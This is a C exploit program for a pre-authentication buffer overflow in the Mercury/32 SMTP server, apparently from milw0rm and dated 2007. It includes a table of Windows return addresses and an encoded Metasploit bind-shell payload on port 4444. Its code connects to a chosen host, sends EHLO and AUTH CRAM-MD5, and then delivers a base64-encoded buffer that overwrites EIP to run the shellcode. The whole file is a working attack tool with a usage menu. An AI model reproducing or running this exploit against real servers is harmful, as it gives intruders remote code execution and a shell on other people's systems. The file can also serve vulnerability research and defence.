/* Dreatica-FXP crew
* 
* ----------------------------------------
* Target         : Mercury/32 SMTP Server
* Found by       : muts@offensive-security.com, http://www.offensive-security.com
* ----------------------------------------
* Exploit        : Mercury/32 v3.32-v4.51 SMTP Pre-Auth EIP overwrite exploit
* Exploit date   : 26.08.2007
* Exploit writer : Heretic2 (heretic2x@gmail.com)
* OS             : Windows ALL 
* Crew           : Dreatica-FXP
* ----------------------------------------
* Info           : The EIP overwrite exploitation is easy here and works on previous versions of the
*                  Mercury/32, like 4.01a, 4.01b and may be earlier. 
* ----------------------------------------
* Thanks to:
*       1. eliteb0y                    (                                                  )
*       2. The Metasploit project      ( http://metasploit.com                            ) 
*       3. http://www.ph4nt0m.org      (                                                  ) 
*       4. Dreatica-FXP crew           (                                                  )
* ----------------------------------------
* This was written for educational purpose only. Use it at your own risk. Author will be not be 
* responsible for any damage, caused by that code.
************************************************************************************
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32")
#include <ctype.h>




void usage(char * s);
void logo();
void end_logo();
void prepare_shellcode(unsigned char * fsh, int sh);
void make_buffer(unsigned char * buf, unsigned int * len, int itarget, int sh);
int send_buffer(unsigned char * buf, unsigned int len, char * remotehost, int port);
SOCKET do_connect (char *remotehost, int port);

void base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len, char * ret) ;
void base64_decode(char const * encoded_string, char * ret) ;

// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring);
char	*optarg;		// global argument pointer
int		optind = 0, opterr; 	// global argv index
// -----------------------------------------------------------------
// -----------------------------------------------------------------


struct {
	const char *t ;
	unsigned long ret ;
} targets[]= 
		{	
			{"UNIVERSAL: Mercury/32 SMTP v4.51 [TER32.dll  ]",        0x258d0d1e },// jmp esp						
			{"Windows XP SP0 RUSSIAN           [shell32.dll]",        0x77b49bbb },// jmp esp
			{"Windows XP SP1 RUSSIAN           [user32.dll ]",        0x77db532f },// jmp esp
			{"Windows XP SP2 RUSSIAN           [shell32.dll]",        0x7d168fe7 },// jmp esp
			{"Windows 2003 SP0 STANDART        [shell32.dll]",        0x77b0f967 },// jmp esp
			{"Debug",                                                 0x42424242 },// 
			{NULL,                                                    0x00000000 }
		};



struct {
	const char * name;
	int length;
	char * shellcode;
}shellcodes[]={ 	
	 {"Bindshell, port 4444   [ args: none ]", 344, 
		 /* win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=Pex http://metasploit.com */
		"\x2b\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x02"
		"\x6b\x82\x87\x83\xee\xfc\xe2\xf4\xfe\x01\x69\xca\xea\x92\x7d\x78"
		"\xfd\x0b\x09\xeb\x26\x4f\x09\xc2\x3e\xe0\xfe\x82\x7a\x6a\x6d\x0c"
		"\x4d\x73\x09\xd8\x22\x6a\x69\xce\x89\x5f\x09\x86\xec\x5a\x42\x1e"
		"\xae\xef\x42\xf3\x05\xaa\x48\x8a\x03\xa9\x69\x73\x39\x3f\xa6\xaf"
		"\x77\x8e\x09\xd8\x26\x6a\x69\xe1\x89\x67\xc9\x0c\x5d\x77\x83\x6c"
		"\x01\x47\x09\x0e\x6e\x4f\x9e\xe6\xc1\x5a\x59\xe3\x89\x28\xb2\x0c"
		"\x42\x67\x09\xf7\x1e\xc6\x09\xc7\x0a\x35\xea\x09\x4c\x65\x6e\xd7"
		"\xfd\xbd\xe4\xd4\x64\x03\xb1\xb5\x6a\x1c\xf1\xb5\x5d\x3f\x7d\x57"
		"\x6a\xa0\x6f\x7b\x39\x3b\x7d\x51\x5d\xe2\x67\xe1\x83\x86\x8a\x85"
		"\x57\x01\x80\x78\xd2\x03\x5b\x8e\xf7\xc6\xd5\x78\xd4\x38\xd1\xd4"
		"\x51\x38\xc1\xd4\x41\x38\x7d\x57\x64\x03\x93\xdb\x64\x38\x0b\x66"
		"\x97\x03\x26\x9d\x72\xac\xd5\x78\xd4\x01\x92\xd6\x57\x94\x52\xef"
		"\xa6\xc6\xac\x6e\x55\x94\x54\xd4\x57\x94\x52\xef\xe7\x22\x04\xce"
		"\x55\x94\x54\xd7\x56\x3f\xd7\x78\xd2\xf8\xea\x60\x7b\xad\xfb\xd0"
		"\xfd\xbd\xd7\x78\xd2\x0d\xe8\xe3\x64\x03\xe1\xea\x8b\x8e\xe8\xd7"
		"\x5b\x42\x4e\x0e\xe5\x01\xc6\x0e\xe0\x5a\x42\x74\xa8\x95\xc0\xaa"
		"\xfc\x29\xae\x14\x8f\x11\xba\x2c\xa9\xc0\xea\xf5\xfc\xd8\x94\x78"
		"\x77\x2f\x7d\x51\x59\x3c\xd0\xd6\x53\x3a\xe8\x86\x53\x3a\xd7\xd6"
		"\xfd\xbb\xea\x2a\xdb\x6e\x4c\xd4\xfd\xbd\xe8\x78\xfd\x5c\x7d\x57"
		"\x89\x3c\x7e\x04\xc6\x0f\x7d\x51\x50\x94\x52\xef\xf2\xe1\x86\xd8"
		"\x51\x94\x54\x78\xd2\x6b\x82\x87"	
	 },	  	
	{NULL , NULL }
};


// -----------------------------------------------------------------
// BASE64
// -----------------------------------------------------------------

char base64_chars[] = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";


static inline bool is_base64(unsigned char c) {
  return (isalnum(c) || (c == '+') || (c == '/'));
}

void base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len, char * ret) 
{
  int i = 0;
  int j = 0;
  unsigned char char_array_3[3];
  unsigned char char_array_4[4];

  while (in_len--) 
  {
    char_array_3[i++] = *(bytes_to_encode++);
    if (i == 3) {
      char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
      char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
      char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
      char_array_4[3] = char_array_3[2] & 0x3f;

      for(i = 0; (i <4) ; i++)
		ret[strlen(ret)]=base64_chars[char_array_4[i]];
        //ret += base64_chars[char_array_4[i]];
      i = 0;
    }
  }

  if (i)
  {
    for(j = i; j < 3; j++)
      char_array_3[j] = '\0';

    char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
    char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
    char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
    char_array_4[3] = char_array_3[2] & 0x3f;

    for (j = 0; (j < i + 1); j++)
		ret[strlen(ret)]=base64_chars[char_array_4[j]];
      //ret += base64_chars[char_array_4[j]];

    while((i++ < 3))
		ret[strlen(ret)]='=';
      //ret += '=';

  }


}

void base64_decode(char const * encoded_string, char * ret) 
{
  int in_len = strlen(encoded_string);//encoded_string.size();
  int i = 0;
  int j = 0;
  int in_ = 0;
  unsigned char char_array_4[4], char_array_3[3];

  while (in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) 
  {
    char_array_4[i++] = encoded_string[in_]; in_++;
    if (i ==4) {
      for (i = 0; i <4; i++)
        char_array_4[i] = strchr(base64_chars, char_array_4[i])-base64_chars;//base64_chars.find(char_array_4[i]);

      char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
      char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
      char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

      for (i = 0; (i < 3); i++)
		  ret[strlen(ret)]=char_array_3[i];
        //ret += char_array_3[i];
      i = 0;
    }
  }

  if (i) {
    for (j = i; j <4; j++)
      char_array_4[j] = 0;

    for (j = 0; j <4; j++)
      char_array_4[j] = strchr(base64_chars, char_array_4[j])-base64_chars;//base64_chars.find(char_array_4[j]);

    char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
    char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
    char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

    for (j = 0; (j < i - 1); j++) ret[strlen(ret)]=char_array_3[j];//ret += char_array_3[j];
  }

}

// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------



int main(int argc, char **argv)
{
	char * remotehost=NULL;
	char default_remotehost[]="127.0.0.1";
	char temp1[100], temp2[100];
	int port, itarget, sh;
	SOCKET s;
	char c;	
	logo();
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);
	if(argc<2)
	{
		usage(argv[0]);		
		return -1;
	}

	// set defaults
	port=25;
	itarget=0;
	sh=0;
	// ------------	
	
	while((c = getopt(argc, argv, "h:p:s:t:"))!= EOF)
	{
		switch (c)
		{
			case 'h':
				remotehost=optarg;
				break; 	
			case 's':
				sscanf(optarg, "%d", &sh);
				sh--;
				break;
			case 't':
				sscanf(optarg, "%d", &itarget);
				itarget--;
				break;
			case 'p':
				sscanf(optarg, "%d", &port);
				break;
			default:
	            usage(argv[0]);
				WSACleanup();
			return -1;
		}		
	}	
	if(remotehost == NULL) remotehost=default_remotehost;
	memset(temp1,0,sizeof(temp1));
	memset(temp2,0,sizeof(temp2));
	memset(temp1, '\x20' , 58 - strlen(remotehost) -1);	
	printf(" #  Host    : %s%s# \n", remotehost, temp1);	
	sprintf(temp2, "%d", port);
	memset(temp1,0,sizeof(temp1));
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);
	printf(" #  Port    : %s%s# \n", temp2, temp1);
	memset(temp1,0,sizeof(temp1));	
	memset(temp2,0,sizeof(temp2));
	sprintf(temp2, "%s", shellcodes[sh].name );
	memset(temp1, '\x20' , 58 - strlen(temp2) -1);	
	printf(" #  Payload : %s%s# \n", temp2, temp1);	
	if(itarget>=0)
	{
		memset(temp1,0,sizeof(temp1));	
		memset(temp1, '\x20' , 57 - strlen(targets[itarget].t) -1);	
		printf(" #  Target  : %s%s# \n", targets[itarget].t, temp1);
	}else
	{		
		printf(" # ------------------------------------------------------------------- # \n");
		printf("[-] Target is invalid\n");
		end_logo();
		return -1;		
	}	
	printf(" # ------------------------------------------------------------------- # \n");
	fflush(stdout);
	printf("[+] Checking if server is online\n");
	fflush(stdout);

	s=do_connect(remotehost, port);   
	if(s==-1)
	{
		printf("[-] Server is OFFLINE\n");
		end_logo();
		return 0;
	}
	closesocket(s);
	printf("[+] Server is ONLINE\n");

	
	
	
	unsigned char buf[50000];
	unsigned int len;
	memset(buf,0,sizeof(buf));
	fflush(stdout);
	make_buffer(buf, &len, itarget, sh);

	printf("[+] Attacking buffers constructed\n");
	if(send_buffer(buf, len, remotehost,port)==-1)
	{
		printf("[-] Cannot exploit server %s\n", remotehost);
		end_logo();
		WSACleanup();
		return -1;
	}

	printf("[+] Buffer sent");
	printf("[+] Now try connect to %s:%d\n", remotehost, 4444);	
	end_logo();
	return 0;
}



SOCKET do_connect (char *remotehost, int port)
{
   static struct hostent *host;
   static struct sockaddr_in addr;
   SOCKET s;	
       host = gethostbyname(remotehost);
       if (!host)
       {
           perror("[-] gethostbyname() failed");
           return -1;
       }
       addr.sin_addr = *(struct in_addr*)host->h_addr;

   s = socket(PF_INET, SOCK_STREAM, 0);
   if (s == -1)
   {
       closesocket(s);
       perror("socket() failed");
       return -1;
   }

   addr.sin_port = htons(port);
   addr.sin_family = AF_INET;

   if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == -1)
   {
       closesocket(s);
      
       return -1;
   }
   return s;
}


void prepare_shellcode( char * fsh, unsigned int * fshlen, int sh)
{
	memcpy(fsh, shellcodes[sh].shellcode, shellcodes[sh].length);
	*fshlen = shellcodes[sh].length;	
}

void make_buffer(unsigned char * buf, unsigned int * len, int itarget, int sh)
{
	// prepare shellcode
	char fsh[10000];	
	unsigned int fshlen;
	memset(fsh, 0, sizeof(fsh));	
	prepare_shellcode(fsh, &fshlen, sh);
	// -----------------

	// make buffer with shellcode inside
	unsigned char * cp=buf;

		// init
	memset(cp, '\x41', 1300);
	cp+=204;

		// replace EIP
	*cp++ = (char)((targets[itarget].ret      ) & 0xff);
	*cp++ = (char)((targets[itarget].ret >>  8) & 0xff);
	*cp++ = (char)((targets[itarget].ret >> 16) & 0xff);
	*cp++ = (char)((targets[itarget].ret >> 24) & 0xff);

		// jff
	*cp++ = '\x90';
	*cp++ = '\x90';
	*cp++ = '\x90';
	*cp++ = '\x90';

		// copy the shellcode
	memcpy(cp, fsh, fshlen);
	cp+=fshlen;

	*len = (unsigned int)(cp-buf);
	// -----------------
	

}



int send_buffer(unsigned char * buf, unsigned int len, char * remotehost, int port)
{
	char bufmax[4096], sendbuf[5000];
	SOCKET s;

	s = do_connect(remotehost, port);
	memset(bufmax, 0 , sizeof(bufmax));
	recv(s, bufmax, sizeof(bufmax),0);
	bufmax[sizeof(bufmax)-1] = 0;
	printf("[+] Server: %s\n", bufmax);

	// send EHLO
	memset(sendbuf, 0, sizeof(sendbuf));
	strcat(sendbuf, "EHLO Dreatica-FXP\r\n");
	printf("[+] Request: EHLO Dreatica-FXP\n");
	send(s, sendbuf, (int)strlen(sendbuf),0);
	
	// send AUTH CRAM-MD5
	memset(sendbuf, 0, sizeof(sendbuf));
	strcat(sendbuf, "AUTH CRAM-MD5\r\n");
	printf("[+] Request: AUTH CRAM-MD5\n");
	send(s, sendbuf, (int)strlen(sendbuf),0);

	
	// i don't make the correct recv procedure like Zhenhan.Liu have done in his code
	// just put 3 recv for that
	memset(bufmax, 0 , sizeof(bufmax));
	recv(s, bufmax, sizeof(bufmax),0);
	bufmax[sizeof(bufmax)-1] = 0;
	printf("[+] Reply: %s\n",bufmax);	
	memset(bufmax, 0 , sizeof(bufmax));
	recv(s, bufmax, sizeof(bufmax),0);
	bufmax[sizeof(bufmax)-1] = 0;
	printf("[+] Reply: %s\n",bufmax);
	memset(bufmax, 0 , sizeof(bufmax));
	recv(s, bufmax, sizeof(bufmax),0);
	bufmax[sizeof(bufmax)-1] = 0;
	printf("[+] Reply: %s\n",bufmax);

	// ALL is OKE	
	printf("[+] Sending payload...\n");
	memset(sendbuf, 0, sizeof(sendbuf));
	base64_encode(buf, len, sendbuf);
	sendbuf[strlen(sendbuf)]= '\r';
	sendbuf[strlen(sendbuf)]= '\n';
	send(s, sendbuf, (int)strlen(sendbuf), 0);
	
	closesocket(s);
	return 1;
}


// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind == 0)
		next = NULL;

	optarg = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind == 0)
			optind++;

		if (optind >= argc || argv[optind][0] != '-' || argv[optind][1] == '\0')
		{
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		if (strcmp(argv[optind], "--") == 0)
		{
			optind++;
			optarg = NULL;
			if (optind < argc)
				optarg = argv[optind];
			return EOF;
		}

		next = argv[optind];
		next++;		// skip past -
		optind++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg = next;
			next = NULL;
		}
		else if (optind < argc)
		{
			optarg = argv[optind];
			optind++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}
// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------



void usage(char * s)
{	
	printf("\n");
	printf("    Usage: %s -p <port> -h <host> -s <shellcode> -t <target>\n\n", s);	
	printf("    Arguments:\n");
	printf("     -p <port>      Port of the Mercury SMTP (default: 25)\n");
	printf("     -h <host>      Hostname of the server\n");
	printf("     -s <shellcode> Payload to use (default: 1)\n");
	printf("     -t <target>    Target to attack (default: 1)\n");
	
	printf("\n");
	printf("    Shellcodes:\n");
	for(int i=0; shellcodes[i].name!=0;i++)
	{
		printf("      %d. %s\n",i+1,shellcodes[i].name);				
	}	
	printf("\n");
	printf("    Targets:\n");
	for(int j=0; targets[j].t!=0;j++)
	{
		printf("      %d. %s\n",j+1,targets[j].t);
	}		
	printf("\n");
	end_logo();	
}

void logo()
{
	printf("\n\n");
	printf(" ####################################################################### \n");	
	printf(" #     ____                 __  _                  ______  __    _____ #\n");
	printf(" #    / __ \\________  _____/ /_(_)_________       / __/\\ \\/ /   / _  / #\n");
	printf(" #   / / / / ___/ _ \\/ __ / __/ / ___/ __ / ___  / /    \\  /   / // /  #\n");
	printf(" #  / /_/ / / /  ___/ /_// /_/ / /__/ /_// /__/ / _/    /  \\  / ___/   #\n");
	printf(" # /_____/_/  \\___/ \\_,_/\\__/_/\\___/\\__,_/     /_/     /_/\\_\\/_/       #\n");
	printf(" #                                 crew                                #\n");
	printf(" ####################################################################### \n");	
	printf(" #  Exploit : Mercury/32 v3.32-v4.51 SMTP EIP overwrite exploit        # \n");
	printf(" #  Tested  : Mercury/32 SMTP v3.32, v4.01a, v4.51                     # \n");
	printf(" #  Author  : Heretic2 (http://www.dreatica.cl/)                       # \n");
	printf(" #  Research: eliteb0y                                                 # \n");
	printf(" #  Version : 1.0                                                      # \n");
	printf(" #  System  : Windows ALL                                              # \n");
	printf(" #  Date    : 26.08.2007                                               # \n");
	printf(" # ------------------------------------------------------------------- # \n");
}

void end_logo()
{
	printf(" # ------------------------------------------------------------------- # \n");
	printf(" #                    Dreatica-FXP crew [Heretic2]                     # \n");	
	printf(" ####################################################################### \n\n");
}

// milw0rm.com [2007-08-26]
